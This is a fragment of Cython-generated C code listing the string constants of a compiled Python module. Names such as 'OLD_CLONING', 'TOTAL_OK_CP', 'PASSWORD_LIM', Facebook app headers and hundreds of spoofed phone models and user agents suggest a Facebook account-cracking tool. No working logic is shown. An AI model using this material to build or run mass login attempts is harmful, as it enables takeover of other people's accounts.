  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_38_5_244m;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_38_5_244m_38;
  PyObject *__pyx_kp_s_38_5_244m_38_5_46m_38_5_244m_38_2;
  PyObject *__pyx_kp_s_38_5_244m_38_5_46m_38_5_244m_38_3;
  PyObject *__pyx_kp_s_38_5_244m_38_5_46m_38_5_244m_38_4;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_4;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_5;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_6;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_7;
  PyObject *__pyx_kp_s_38_5_244m_38_5_46m_8;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_CHOICE;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_DO_YOU_WENT;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_EXAMPLE_sdca;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_EXIT_DONE;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_FILE_LOCATIO;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_FILE_NAME;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_IF_NO_RESULT;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_NO_INTERNET;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_OPTION_NOT_F;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_PASSWORD_LIM;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_PASSWORD_NO;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_PASS_38_5_24;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_PRESS_ENTER;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_THE_PROCESS;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_TOTAL_ACCOUN;
  PyObject *__pyx_kp_u_38_5_244m_38_5_46m_TOTAL_OK_CP;
  PyObject *__pyx_kp_u_38_5_244m_4;
  PyObject *__pyx_kp_u_38_5_244m_5;
  PyObject *__pyx_kp_s_38_5_244m_KEY_IS_NOT_APPROVED;
  PyObject *__pyx_kp_s_38_5_46m;
  PyObject *__pyx_kp_s_38_5_47m;
  PyObject *__pyx_kp_s_38_5_48m;
  PyObject *__pyx_kp_s_38_5_49m;
  PyObject *__pyx_kp_s_38_5_50m;
  PyObject *__pyx_kp_u_38_5_81mCP_1_37m_38_5_81m;
  PyObject *__pyx_kp_s_38_5_86m;
  PyObject *__pyx_kp_s_38_5_8m;
  PyObject *__pyx_kp_u_3_38_5_244m_38_5_46m_OLD_CLONING;
  PyObject *__pyx_kp_s_4;
  PyObject *__pyx_kp_s_4YYU8;
  PyObject *__pyx_kp_s_5;
  PyObject *__pyx_kp_u_5;
  PyObject *__pyx_kp_u_537_36_Puffin_9_7_2;
  PyObject *__pyx_kp_u_59;
  PyObject *__pyx_kp_s_6;
  PyObject *__pyx_kp_s_7;
  PyObject *__pyx_kp_s_708090;
  PyObject *__pyx_kp_s_8;
  PyObject *__pyx_kp_s_9;
  PyObject *__pyx_kp_s_980;
  PyObject *__pyx_n_s_A;
  PyObject *__pyx_n_s_A525FXXU3AUG4;
  PyObject *__pyx_n_s_A715FXXU3ATI8;
  PyObject *__pyx_n_s_AM;
  PyObject *__pyx_n_u_AP;
  PyObject *__pyx_kp_u_AYYUB_CP_38_5_244m;
  PyObject *__pyx_n_s_AYYUB_M1;
  PyObject *__pyx_n_s_AYYUB_M2;
  PyObject *__pyx_kp_s_Accept_Encoding;
  PyObject *__pyx_kp_s_Android;
  PyObject *__pyx_kp_u_AppleWebKit;
  PyObject *__pyx_kp_u_AppleWebKit_534_30_KHTML_like_G;
  PyObject *__pyx_kp_u_AppleWebKit_537_36_KHTML_like_G;
  PyObject *__pyx_kp_s_AppleWebKit_537_36_KHTML_like_G_2;
  PyObject *__pyx_kp_u_AppleWebKit_537_36_KHTML_like_G_3;
  PyObject *__pyx_n_s_April;
  PyObject *__pyx_n_s_August;
  PyObject *__pyx_n_s_Authorization;
  PyObject *__pyx_n_s_B;
  PyObject *__pyx_n_s_BD;
  PyObject *__pyx_n_s_BD_locals_genexpr;
  PyObject *__pyx_kp_s_Black_Shark;
  PyObject *__pyx_kp_s_Black_Shark_2;
  PyObject *__pyx_kp_s_Black_Shark_3;
  PyObject *__pyx_kp_s_Black_Shark_3S;
  PyObject *__pyx_kp_s_Black_Shark_4;
  PyObject *__pyx_kp_s_Black_Shark_4_Pro;
  PyObject *__pyx_kp_s_Black_Shark_5;
  PyObject *__pyx_kp_s_Black_Shark_5_Pro;
  PyObject *__pyx_kp_s_Black_Shark_Helo;
  PyObject *__pyx_kp_s_Build;
  PyObject *__pyx_kp_u_Build;
  PyObject *__pyx_kp_u_Build_PPR1;
  PyObject *__pyx_n_s_C;
  PyObject *__pyx_n_s_CPH1801;
  PyObject *__pyx_n_s_CPH1803;
  PyObject *__pyx_n_s_CPH1805;
  PyObject *__pyx_n_s_CPH1809;
  PyObject *__pyx_n_s_CPH1827;
  PyObject *__pyx_n_s_CPH1837;
  PyObject *__pyx_n_s_CPH1851;
  PyObject *__pyx_n_s_CPH1853;
  PyObject *__pyx_n_s_CPH1979;
  PyObject *__pyx_n_s_CPH1983;
  PyObject *__pyx_n_s_CPH1987;
  PyObject *__pyx_n_s_CPH2005;
  PyObject *__pyx_n_s_CPH2009;
  PyObject *__pyx_n_s_CPH2015;
  PyObject *__pyx_n_s_CPH2059;
  PyObject *__pyx_n_s_CPH2061;
  PyObject *__pyx_n_s_CPH2065;
  PyObject *__pyx_n_s_CPH2069;
  PyObject *__pyx_n_s_CPH2071;
  PyObject *__pyx_n_s_CPH2073;
  PyObject *__pyx_n_s_CPH2077;
  PyObject *__pyx_n_s_CPH2091;
  PyObject *__pyx_n_s_CPH2095;
  PyObject *__pyx_n_s_CPH2099;
  PyObject *__pyx_n_s_CPH2137;
  PyObject *__pyx_n_s_CPH2139;
  PyObject *__pyx_n_s_CPH2145;
  PyObject *__pyx_n_s_CPH2161;
  PyObject *__pyx_n_s_CPH2185;
  PyObject *__pyx_n_s_CPH2201;
  PyObject *__pyx_n_s_CPH2209;
  PyObject *__pyx_kp_u_Chrome;
  PyObject *__pyx_n_s_Civi;
  PyObject *__pyx_kp_s_Civi_2;
  PyObject *__pyx_n_s_ConnectionError;
  PyObject *__pyx_kp_s_Content_Type;
  PyObject *__pyx_n_s_D;
  PyObject *__pyx_kp_s_Davik_2_1_0_Linux_U_Android;
  PyObject *__pyx_n_s_December;
  PyObject *__pyx_n_s_Devember;
  PyObject *__pyx_n_s_EPE54B;
  PyObject *__pyx_n_s_EX;
  PyObject *__pyx_n_s_EXCELLENT;
  PyObject *__pyx_n_s_F916BXXU1BTKF;
  PyObject *__pyx_n_s_FB4A;
  PyObject *__pyx_kp_s_FBAN;
  PyObject *__pyx_kp_s_FBAN_FB4A_FBAV;
  PyObject *__pyx_kp_s_FBAN_FB4A_FBAV_59_0_0_15_313_FB;
  PyObject *__pyx_kp_s_FBAN_FB4A_FBAV_59_0_0_15_313_FB_2;
  PyObject *__pyx_kp_s_FBAV;
  PyObject *__pyx_kp_s_FBBD;
  PyObject *__pyx_kp_s_FBBV;
  PyObject *__pyx_kp_s_FBCR;
  PyObject *__pyx_kp_s_FBDM_density_2_625_width_1080_h;
  PyObject *__pyx_kp_s_FBDV;
  PyObject *__pyx_kp_s_FBMF;
  PyObject *__pyx_kp_s_FBOP_19_FBCA;
  PyObject *__pyx_kp_s_FBPN;
  PyObject *__pyx_kp_s_FBRV;
  PyObject *__pyx_kp_s_FBSV;
  PyObject *__pyx_n_s_February;
  PyObject *__pyx_n_s_FileNotFoundError;
  PyObject *__pyx_n_s_First;
  PyObject *__pyx_n_s_G;
  PyObject *__pyx_n_s_G1;
  PyObject *__pyx_n_s_G2;
  PyObject *__pyx_n_s_G3;
  PyObject *__pyx_n_s_G4;
  PyObject *__pyx_n_s_G5;
  PyObject *__pyx_n_s_G950FXXS5DSF1;
  PyObject *__pyx_n_s_G950FXXS6DTA1;
  PyObject *__pyx_n_s_G950FXXS8DTC6;
  PyObject *__pyx_n_s_G950FXXU3CRGH;
  PyObject *__pyx_n_s_G950FXXU4DSBA;
  PyObject *__pyx_n_s_G975USQU4ETG1;
  PyObject *__pyx_n_s_G985FXXU7DTJ2;
  PyObject *__pyx_n_s_G998USQU1ATCU;
  PyObject *__pyx_n_s_GET;
  PyObject *__pyx_kp_s_GT_I9190;
  PyObject *__pyx_kp_s_GT_I9192;
  PyObject *__pyx_kp_s_GT_I9300;
  PyObject *__pyx_kp_s_GT_I9300I;
  PyObject *__pyx_kp_s_GT_I9301I;
  PyObject *__pyx_kp_s_GT_I9500;
  PyObject *__pyx_kp_s_GT_N5100;
  PyObject *__pyx_kp_s_GT_N7100;
  PyObject *__pyx_kp_s_GT_N8000;
  PyObject *__pyx_kp_s_GT_P3110;
  PyObject *__pyx_kp_s_GT_P5100;
  PyObject *__pyx_kp_s_GT_P5110;
  PyObject *__pyx_kp_s_GT_P5200;
  PyObject *__pyx_kp_s_GT_P5210;
  PyObject *__pyx_kp_s_GT_P5220;
  PyObject *__pyx_kp_s_GT_S7390;
  PyObject *__pyx_n_s_HLK75C;
  PyObject *__pyx_n_s_HLK75F;
  PyObject *__pyx_n_s_HLK75H;
  PyObject *__pyx_n_s_HRI83;
  PyObject *__pyx_n_s_Hongmi;
  PyObject *__pyx_kp_s_Hongmi_1S;
  PyObject *__pyx_kp_s_Hongmi_2;
  PyObject *__pyx_kp_s_Hongmi_2_3G;
  PyObject *__pyx_kp_s_Hongmi_2_4G;
  PyObject *__pyx_kp_s_Hongmi_4G;
  PyObject *__pyx_kp_s_Hongmi_Note_1TD;
  PyObject *__pyx_n_s_IML74K;
  PyObject *__pyx_n_s_IMM76D;
  PyObject *__pyx_kp_s_Installing_missing_modules;
  PyObject *__pyx_n_s_JDQ;
  PyObject *__pyx_n_s_JDQ39;
  PyObject *__pyx_n_s_JSS15J;
  PyObject *__pyx_n_s_JWR66L;
  PyObject *__pyx_n_s_JZO54K;
  PyObject *__pyx_n_s_January;
  PyObject *__pyx_n_s_July;
  PyObject *__pyx_n_s_June;
  PyObject *__pyx_kp_u_KHTML_like_Gecko_Chrome;
  PyObject *__pyx_kp_u_KHTML_like_Gecko_UCBrowser_79_0;
  PyObject *__pyx_kp_u_KHTML_like_Gecko_Version;
  PyObject *__pyx_n_s_KOT4;
  PyObject *__pyx_n_s_KOT49H;
  PyObject *__pyx_n_s_KTU84P;
  PyObject *__pyx_n_s_LMY4;
  PyObject *__pyx_n_s_LMY47V;
  PyObject *__pyx_n_s_LMY48G;
  PyObject *__pyx_n_s_LMY48J;
  PyObject *__pyx_n_s_LRX22C;
  PyObject *__pyx_n_s_LRX22G;
  PyObject *__pyx_kp_s_LRX22G_2;
  PyObject *__pyx_n_s_Last;
  PyObject *__pyx_n_s_Liger;
  PyObject *__pyx_kp_s_Log_In;
  PyObject *__pyx_n_s_M;
  PyObject *__pyx_n_u_M;
  PyObject *__pyx_n_s_M1;
  PyObject *__pyx_kp_u_M1_38_5_244m_38_5_244m;
  PyObject *__pyx_kp_u_M2_38_5_244m;
  PyObject *__pyx_n_s_M3;
  PyObject *__pyx_n_s_M3s;
  PyObject *__pyx_kp_s_M5_Lite;
  PyObject *__pyx_kp_s_M6_Note;
  PyObject *__pyx_n_s_MB526;
  PyObject *__pyx_n_s_MDB08M;
  PyObject *__pyx_kp_s_MI_2;
  PyObject *__pyx_kp_s_MI_3W;
  PyObject *__pyx_kp_s_MI_4i;
  PyObject *__pyx_kp_s_MI_5;
  PyObject *__pyx_kp_s_MI_5X;
  PyObject *__pyx_n_s_MMB29K;
  PyObject *__pyx_n_s_MMB29M;
  PyObject *__pyx_n_s_MMB29U;
  PyObject *__pyx_kp_s_MT6765_G_Series;
  PyObject *__pyx_n_s_MX2;
  PyObject *__pyx_n_s_MX380;
  PyObject *__pyx_n_s_MX5;
  PyObject *__pyx_kp_s_M_Bot_54;
  PyObject *__pyx_kp_s_M_Bot_60;
  PyObject *__pyx_n_s_Magic;
  PyObject *__pyx_kp_s_Maimang_5;
  PyObject *__pyx_n_s_March;
  PyObject *__pyx_kp_s_Mate_10_Lite_Dual_SIM;
  PyObject *__pyx_kp_s_Mate_20_X_China;
  PyObject *__pyx_kp_s_Mate_8;
  PyObject *__pyx_n_s_May;
  PyObject *__pyx_kp_s_Medias_X;
  PyObject *__pyx_n_s_Mi5;
  PyObject *__pyx_kp_s_MiTV_4A;
  PyObject *__pyx_kp_s_MiTV_4A_Pro;
  PyObject *__pyx_kp_s_MiTV_4C;
  PyObject *__pyx_kp_s_MiTV_4I;
  PyObject *__pyx_kp_s_MiTV_4S;
  PyObject *__pyx_kp_s_MiTV_4X;
  PyObject *__pyx_kp_s_MiTV_P1;
  PyObject *__pyx_kp_s_MiTV_Q1;
  PyObject *__pyx_kp_s_MiTV_Stick;
  PyObject *__pyx_kp_s_MiTV_Stick_4K;
  PyObject *__pyx_kp_s_Mi_4_LTE;
  PyObject *__pyx_kp_s_Mi_A1;
  PyObject *__pyx_kp_s_Mi_Box_4;
  PyObject *__pyx_kp_s_Mi_CC9;
  PyObject *__pyx_kp_s_Mi_CC_9;
  PyObject *__pyx_kp_s_Mi_CC_9_Pro;
  PyObject *__pyx_kp_s_Mi_CC_9e;
  PyObject *__pyx_kp_s_Mi_Cancro;
  PyObject *__pyx_kp_s_Mi_Laser_Projector_150;
  PyObject *__pyx_kp_s_Mi_MAX2;
  PyObject *__pyx_kp_s_Mi_Max;
  PyObject *__pyx_kp_s_Mi_Max3;
  PyObject *__pyx_kp_s_Mi_Max_2;
  PyObject *__pyx_kp_s_Mi_Max_3;
  PyObject *__pyx_kp_s_Mi_Mix;
  PyObject *__pyx_kp_s_Mi_Mix_2;
  PyObject *__pyx_kp_s_Mi_Mix_2S;
  PyObject *__pyx_kp_s_Mi_Mix_3;
  PyObject *__pyx_kp_s_Mi_Mix_3_5G;
  PyObject *__pyx_kp_s_Mi_Mix_4;
  PyObject *__pyx_kp_s_Mi_Mix_Fold;
  PyObject *__pyx_kp_s_Mi_Note10;
  PyObject *__pyx_kp_s_Mi_Note5;
  PyObject *__pyx_kp_s_Mi_Note_10;
  PyObject *__pyx_kp_s_Mi_Note_10_Lite;
  PyObject *__pyx_kp_s_Mi_Note_10_Pro;
  PyObject *__pyx_kp_s_Mi_Note_11;
  PyObject *__pyx_kp_s_Mi_Note_2;
  PyObject *__pyx_kp_s_Mi_Note_3;
  PyObject *__pyx_kp_s_Mi_Note_8;
  PyObject *__pyx_kp_s_Mi_Note_LTE;
  PyObject *__pyx_kp_s_Mi_Note_Pro;
  PyObject *__pyx_kp_s_Mi_One;
  PyObject *__pyx_kp_s_Mi_One_C1;
  PyObject *__pyx_kp_s_Mi_One_Plus;
  PyObject *__pyx_kp_s_Mi_Pad;
  PyObject *__pyx_kp_s_Mi_Pad4;
  PyObject *__pyx_kp_s_Mi_Pad5;
  PyObject *__pyx_kp_s_Mi_Pad_2;
  PyObject *__pyx_kp_s_Mi_Pad_3;
  PyObject *__pyx_kp_s_Mi_Pad_4;
  PyObject *__pyx_kp_s_Mi_Pad_4_Plus;
  PyObject *__pyx_kp_s_Mi_Pad_5;
  PyObject *__pyx_kp_s_Mi_Pad_5_Pro;
  PyObject *__pyx_kp_s_Mi_Pad_5_Pro_5G;
  PyObject *__pyx_kp_s_Mi_Play;
  PyObject *__pyx_kp_s_Mi_XL;
  PyObject *__pyx_n_s_Milestone;
  PyObject *__pyx_n_s_Miracle;
  PyObject *__pyx_kp_s_Mix_Fold_2;
  PyObject *__pyx_kp_u_Mobile_Safari;
  PyObject *__pyx_kp_u_Mobile_Safari_537_36_XiaoMi_Miu;
  PyObject *__pyx_n_s_ModuleNotFoundError;
  PyObject *__pyx_kp_s_Moment_Sprint;
  PyObject *__pyx_n_s_Monza;
  PyObject *__pyx_kp_s_Motion_Plus;
  PyObject *__pyx_kp_s_Moto_C;
  PyObject *__pyx_kp_s_Moto_E2_4G_LTE;
  PyObject *__pyx_kp_s_Moto_E3_Power;
  PyObject *__pyx_kp_s_Moto_E4;
  PyObject *__pyx_kp_s_Moto_E4_Plus;
  PyObject *__pyx_kp_s_Moto_E5;
  PyObject *__pyx_kp_s_Moto_E5_Plus;
  PyObject *__pyx_kp_s_Moto_G;
  PyObject *__pyx_kp_s_Moto_G3;
  PyObject *__pyx_kp_s_Moto_G3_Turbo_Edition;
  PyObject *__pyx_kp_s_Moto_G4;
  PyObject *__pyx_kp_s_Moto_G5_Plus;
  PyObject *__pyx_kp_s_Moto_G5s;
  PyObject *__pyx_kp_s_Moto_G5s_Plus;
  PyObject *__pyx_kp_s_Moto_G6;
  PyObject *__pyx_kp_s_Moto_G_2nd_Gen;
  PyObject *__pyx_kp_s_Moto_G_Play;
  PyObject *__pyx_kp_s_Moto_X;
  PyObject *__pyx_kp_s_Moto_X_2nd_Gen_AT_T;
  PyObject *__pyx_kp_s_Moto_Z;
  PyObject *__pyx_kp_u_Mozilla_5_0_Linux_Android;
  PyObject *__pyx_kp_u_Mozilla_5_0_Linux_U_Android_10_e;
  PyObject *__pyx_kp_u_Mozilla_5_0_Linux_U_Android_13_p;
  PyObject *__pyx_kp_u_Mozilla_5_0_Linux_arm_64_Android;
  PyObject *__pyx_kp_u_Mozilla_5_0_Macintosh_Intel_Mac;
  PyObject *__pyx_kp_u_Mozilla_5_0_Windows_NT;
  PyObject *__pyx_kp_u_Mozilla_5_0_Windows_NT_10_0_Win6;
  PyObject *__pyx_kp_u_Mozilla_5_0_Windows_NT_6;
  PyObject *__pyx_kp_u_Mozilla_5_0_Windows_U_Windows_NT;
  PyObject *__pyx_kp_u_Mozilla_5_0_X11_Linux_x86_64_And;
  PyObject *__pyx_kp_s_MultiPhone_3350_Duo;
  PyObject *__pyx_kp_s_MultiPhone_4044_Duo;
  PyObject *__pyx_kp_s_MultiPhone_5504_DUO;
  PyObject *__pyx_kp_s_Multipad_2_Ultra_Duo_8_0_3G;
  PyObject *__pyx_kp_s_Multiphone_7600_Duo;
  PyObject *__pyx_n_s_N4F26J;
  PyObject *__pyx_n_s_N4F26X;
  PyObject *__pyx_n_s_N970FXXS8ETK4;
  PyObject *__pyx_n_s_N986BXXU1BTJ4;
  PyObject *__pyx_n_s_N9F27L;
  PyObject *__pyx_n_s_ND;
  PyObject *__pyx_n_s_NDE63H;
  PyObject *__pyx_n_s_NMF2;
  PyObject *__pyx_n_s_NMF26X;
  PyObject *__pyx_kp_s_NMF26X_2;
  PyObject *__pyx_n_s_NMF27D;
  PyObject *__pyx_n_s_NRD90M;
  PyObject *__pyx_kp_s_NRD90M_2;
  PyObject *__pyx_n_s_Name;
  PyObject *__pyx_n_u_NokiaX;
  PyObject *__pyx_kp_s_Not_A_Brand_v_8_0_0_0_Chromium;
  PyObject *__pyx_kp_s_Not_A_Brand_v_8_Chromium_v_120;
  PyObject *__pyx_kp_s_Note_12_Pro;
  PyObject *__pyx_n_s_November;
  PyObject *__pyx_kp_u_OAuth;
  PyObject *__pyx_kp_s_OPM2_171026_006_C1;
  PyObject *__pyx_kp_s_OPM6_171019_030_K1;
  PyObject *__pyx_kp_s_OT_7025D;
  PyObject *__pyx_n_s_OUT;
  PyObject *__pyx_n_s_October;
  PyObject *__pyx_kp_s_Optimus_Vu;
  PyObject *__pyx_kp_s_P10_Lite_LTE;
  PyObject *__pyx_n_s_P2;
  PyObject *__pyx_kp_s_P20_Lite;
  PyObject *__pyx_kp_s_P30_Pro_Global;
  PyObject *__pyx_n_s_P3400;
  PyObject *__pyx_kp_s_P55_Max;
  PyObject *__pyx_kp_s_P7_Max;
  PyObject *__pyx_kp_s_P8_Lite;
  PyObject *__pyx_kp_s_P9_Lite;
  PyObject *__pyx_n_s_PM;
  PyObject *__pyx_kp_s_PPR1_180610_011;
  PyObject *__pyx_kp_s_PPR2_180905_006;
  PyObject *__pyx_kp_s_PQ1A_181205_002_A1;
  PyObject *__pyx_kp_s_PQ1A_181205_006;
  PyObject *__pyx_kp_s_PQ3B_190801_002;
  PyObject *__pyx_kp_s_Pacific_800i;
  PyObject *__pyx_kp_s_Pad_6_Pro;
  PyObject *__pyx_kp_s_Pearl_8100;
  PyObject *__pyx_kp_s_Phoenix_2;
  PyObject *__pyx_n_s_Phone;
  PyObject *__pyx_n_s_PhotosAYYUB;
  PyObject *__pyx_n_s_Pixel;
  PyObject *__pyx_kp_s_Pixel_3;
  PyObject *__pyx_kp_s_Pixel_XL;
  PyObject *__pyx_n_s_Pixi;
  PyObject *__pyx_kp_s_Please_Confirm_Email;
  PyObject *__pyx_kp_s_Pocophone_F1;
  PyObject *__pyx_kp_s_Prada_3_0;
  PyObject *__pyx_n_s_Pre3;
  PyObject *__pyx_kp_s_Primo_GH7;
  PyObject *__pyx_kp_u_Profile_MIDP_2_1_Configuration_C;
  PyObject *__pyx_kp_s_QKQ1_190910_002;
  PyObject *__pyx_kp_s_QP1A_191105_003;
  PyObject *__pyx_kp_s_Qin_1s;
  PyObject *__pyx_kp_s_Qin_2;
  PyObject *__pyx_kp_s_Qin_2_Pro;
  PyObject *__pyx_kp_s_Quad_EVO_Energy_5;
  PyObject *__pyx_kp_s_Quantum_4;
  PyObject *__pyx_n_s_R;
  PyObject *__pyx_kp_s_RD1A_201105_003_C1;
  PyObject *__pyx_n_s_RMX2085;
  PyObject *__pyx_n_s_RMX2185;
  PyObject *__pyx_kp_s_RM_560;
  PyObject *__pyx_kp_s_RP1A_201005_004_A1;
  PyObject *__pyx_kp_s_Radar_4G;
  PyObject *__pyx_kp_s_Radar_C110e;
  PyObject *__pyx_n_s_Random;
  PyObject *__pyx_n_s_Realme;
  PyObject *__pyx_kp_s_Realme_2;
  PyObject *__pyx_kp_s_Red_Rice;
  PyObject *__pyx_kp_u_Redmi;
  PyObject *__pyx_kp_s_Redmi_11;
  PyObject *__pyx_kp_s_Redmi_12;
  PyObject *__pyx_kp_s_Redmi_2;
  PyObject *__pyx_kp_s_Redmi_3;
  PyObject *__pyx_kp_s_Redmi_3S;
  PyObject *__pyx_kp_s_Redmi_4;
  PyObject *__pyx_kp_s_Redmi_4A;
  PyObject *__pyx_kp_s_Redmi_4X;
  PyObject *__pyx_kp_s_Redmi_5;
  PyObject *__pyx_kp_s_Redmi_5A;
  PyObject *__pyx_kp_s_Redmi_5_Plus;
  PyObject *__pyx_kp_s_Redmi_6;
  PyObject *__pyx_kp_s_Redmi_7;
  PyObject *__pyx_kp_s_Redmi_8;
  PyObject *__pyx_kp_s_Redmi_9;
  PyObject *__pyx_kp_s_Redmi_A1;
  PyObject *__pyx_kp_s_Redmi_A2;
  PyObject *__pyx_kp_s_Redmi_A3;
  PyObject *__pyx_kp_s_Redmi_K30;
  PyObject *__pyx_kp_s_Redmi_K40;
  PyObject *__pyx_kp_s_Redmi_K50;
  PyObject *__pyx_kp_s_Redmi_K60;
  PyObject *__pyx_kp_s_Redmi_Note;
  PyObject *__pyx_kp_s_Redmi_Note10;
  PyObject *__pyx_kp_s_Redmi_Note10T;
  PyObject *__pyx_kp_s_Redmi_Note7;
  PyObject *__pyx_kp_s_Redmi_Note8;
  PyObject *__pyx_kp_s_Redmi_Note8T;
  PyObject *__pyx_kp_s_Redmi_Note9;
  PyObject *__pyx_kp_s_Redmi_Note_1;
  PyObject *__pyx_kp_s_Redmi_Note_10Redmi_Note_11;
  PyObject *__pyx_kp_s_Redmi_Note_12;
  PyObject *__pyx_kp_s_Redmi_Note_12T;
  PyObject *__pyx_kp_s_Redmi_Note_13;
  PyObject *__pyx_kp_s_Redmi_Note_15_Pro;
  PyObject *__pyx_kp_s_Redmi_Note_2;
  PyObject *__pyx_kp_s_Redmi_Note_3;
  PyObject *__pyx_kp_s_Redmi_Note_4;
  PyObject *__pyx_kp_s_Redmi_Note_4X;
  PyObject *__pyx_kp_s_Redmi_Note_5;
  PyObject *__pyx_kp_s_Redmi_Note_5A;
  PyObject *__pyx_kp_s_Redmi_Note_5A_Prime;
  PyObject *__pyx_kp_s_Redmi_Note_5_Pro;
  PyObject *__pyx_kp_s_Redmi_Note_6;
  PyObject *__pyx_kp_s_Redmi_Note_7;
  PyObject *__pyx_kp_s_Redmi_Note_7_Pro;
  PyObject *__pyx_kp_s_Redmi_Note_8T;
  PyObject *__pyx_kp_s_Redmi_Note_8_Pro;
  PyObject *__pyx_kp_s_Redmi_Note_9;
  PyObject *__pyx_kp_s_Redmi_Note_9S;
  PyObject *__pyx_kp_s_Redmi_Note_9T;
  PyObject *__pyx_kp_s_Redmi_Note_9T_5G;
  PyObject *__pyx_kp_s_Redmi_Note_9_5G;
  PyObject *__pyx_kp_s_Redmi_Note_9_Pro;
  PyObject *__pyx_kp_s_Redmi_Note_9_Pro_5G;
  PyObject *__pyx_kp_s_Redmi_Note_9_Pro_Max;
  PyObject *__pyx_kp_s_Redmi_Note_Prime;
  PyObject *__pyx_kp_s_Redmi_Pad;
  PyObject *__pyx_kp_s_Redmi_Pro;
  PyObject *__pyx_kp_s_Redmi_S2;
  PyObject *__pyx_kp_s_Redmi_X;
  PyObject *__pyx_kp_s_Redmi_Y1;
  PyObject *__pyx_kp_s_Redmi_Y1_Lite;
  PyObject *__pyx_kp_s_Redmi_Y2;
  PyObject *__pyx_kp_s_Redmi_Y3;
  PyObject *__pyx_kp_s_Redmi_note;
  PyObject *__pyx_kp_s_Rex_60;
  PyObject *__pyx_kp_s_Rex_80;
  PyObject *__pyx_n_s_Rhyme;
  PyObject *__pyx_n_s_Ruby;
  PyObject *__pyx_n_s_S;
  PyObject *__pyx_n_s_S4502M;
  PyObject *__pyx_n_s_S4505M;
  PyObject *__pyx_n_s_S4702M;
  PyObject *__pyx_n_s_S580;
  PyObject *__pyx_n_s_S616;
  PyObject *__pyx_n_s_S660;
  PyObject *__pyx_kp_s_SA_str_rr_1_9_Mobile_Safari_str;
  PyObject *__pyx_kp_s_SD1A_210817_037_A1;
  PyObject *__pyx_kp_s_SGH_E250;
  PyObject *__pyx_kp_s_SGH_I547;
  PyObject *__pyx_kp_s_SM_A500F;
  PyObject *__pyx_kp_s_SM_A500FU;
  PyObject *__pyx_kp_s_SM_A500H;
  PyObject *__pyx_kp_s_SM_G485F;
  PyObject *__pyx_kp_s_SM_G900F;
  PyObject *__pyx_kp_s_SM_G920F;
  PyObject *__pyx_kp_s_SM_G930F;
  PyObject *__pyx_kp_s_SM_G935F;
  PyObject *__pyx_kp_s_SM_G950F;
  PyObject *__pyx_kp_s_SM_J320F;
  PyObject *__pyx_kp_s_SM_J320FN;
  PyObject *__pyx_kp_s_SM_J320H;
  PyObject *__pyx_kp_s_SM_J320M;
  PyObject *__pyx_kp_s_SM_J510FN;
  PyObject *__pyx_kp_s_SM_J701F;
  PyObject *__pyx_kp_s_SM_T111;
  PyObject *__pyx_kp_s_SM_T230;
  PyObject *__pyx_kp_s_SM_T231;
  PyObject *__pyx_kp_s_SM_T235;
  PyObject *__pyx_kp_s_SM_T310;
  PyObject *__pyx_kp_s_SM_T311;
  PyObject *__pyx_kp_s_SM_T315;
  PyObject *__pyx_kp_s_SM_T525;
  PyObject *__pyx_kp_s_SM_T531;
  PyObject *__pyx_kp_s_SM_T535;
  PyObject *__pyx_kp_s_SM_T555;
  PyObject *__pyx_kp_s_SM_T561;
  PyObject *__pyx_kp_s_SM_T705;
  PyObject *__pyx_kp_s_SM_T805;
  PyObject *__pyx_kp_s_SM_T820;
  PyObject *__pyx_kp_s_SPH_L720;
  PyObject *__pyx_kp_s_SQ1A_211205_008;
  PyObject *__pyx_kp_u_Safari;
  PyObject *__pyx_kp_u_Safari_537_36_Edg;
  PyObject *__pyx_n_s_Sensation;
  PyObject *__pyx_n_s_September;
  PyObject *__pyx_n_s_Session;
  PyObject *__pyx_n_s_Spark;
  PyObject *__pyx_kp_s_Star_3_Duos;
  PyObject *__pyx_kp_s_Storm_9530;
  PyObject *__pyx_n_s_Stream;
  PyObject *__pyx_kp_s_Stylo_2_Plus_T_Mobile;
  PyObject *__pyx_kp_s_Stylus_2;
  PyObject *__pyx_n_s_T500XXU3BUA8;
  PyObject *__pyx_n_s_T970XXU3BUI7;
  PyObject *__pyx_kp_s_TM_4377;
  PyObject *__pyx_kp_s_TQ1A_230105_001_A3;
  PyObject *__pyx_n_s_ThreadPoolExecutor;
  PyObject *__pyx_kp_s_Torch_4G_9810;
  PyObject *__pyx_kp_s_User_Agent;
  PyObject *__pyx_kp_s_V10_AT_T;
  PyObject *__pyx_kp_s_V10_T_Mobile;
  PyObject *__pyx_kp_s_V10_Verizon;
  PyObject *__pyx_n_s_V1Max;
  PyObject *__pyx_n_s_V20;
  PyObject *__pyx_kp_s_V20_AT_T;
  PyObject *__pyx_kp_s_V20_Sprint;
  PyObject *__pyx_kp_s_V20_T_Mobile;
  PyObject *__pyx_kp_s_V20_Verizon;
  PyObject *__pyx_n_s_V3;
  PyObject *__pyx_n_s_V5;
  PyObject *__pyx_n_s_V5s;
  PyObject *__pyx_n_s_V7;
  PyObject *__pyx_kp_s_V7_Plus;
  PyObject *__pyx_n_s_V808;
  PyObject *__pyx_n_s_V9;
  PyObject *__pyx_kp_s_VR_Bot_552;
  PyObject *__pyx_n_s_VX5500;
  PyObject *__pyx_n_s_Valencia;
  PyObject *__pyx_n_s_ValueError;
  PyObject *__pyx_kp_s_Vdeo_2;
  PyObject *__pyx_kp_s_Vega_Iron_2_WiFi;
  PyObject *__pyx_kp_s_Vibe_K5;
  PyObject *__pyx_kp_s_Vibe_K5_Note;
